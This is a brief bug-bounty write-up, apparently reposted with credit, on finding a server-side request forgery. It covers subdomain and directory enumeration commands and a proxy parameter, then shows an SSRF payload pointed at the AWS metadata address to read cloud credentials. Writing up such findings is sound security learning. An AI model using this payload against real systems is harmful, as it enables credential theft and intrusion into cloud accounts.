# ***My First Case of SSRF Using Dirsearch 🐿️***

*1. I started by getting all the subdomains and directories of my target using Subfinder*
```
subfinder -d target.com | tee target.txt
python3 dirsearch.py -l target.txt --deep-recursive
```
*2. I found a URL that was like:*
```
targetconnect-dev.target.com/proxy.stream?origin=https://google.com
```
*3. I tried using an Out Of Band Interaction Tester (OOB) like BurpSuite Collaborator and it worked. I received a pingback.* <br>
*4. I now searched the parameter on Google and found a tweet where someone tried to use the AWS Metadata URL, so I tried using it and it worked.*<br>
```
/proxy.stream?origin=http://169.254.169.254/latest/metadata/
```
*I was able to view the AWS Metadata credentials.*
<br>&nbsp;

----
## ***Credit***
Based on [Mba-oji Chiagoziem](https://goziem.medium.com/my-first-case-of-ssrf-using-dirsearch-b916f0f1e94b)'s writeup.

----
## ***Support***
You can Follow [me](https://www.linkedin.com/in/bhavesh-pardhi-/) on LinkedIn or
<br><br>[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support-orange?style=for-the-badge&logo=buy-me-a-coffee)](https://www.buymeacoffee.com/bhaveshpardhi)
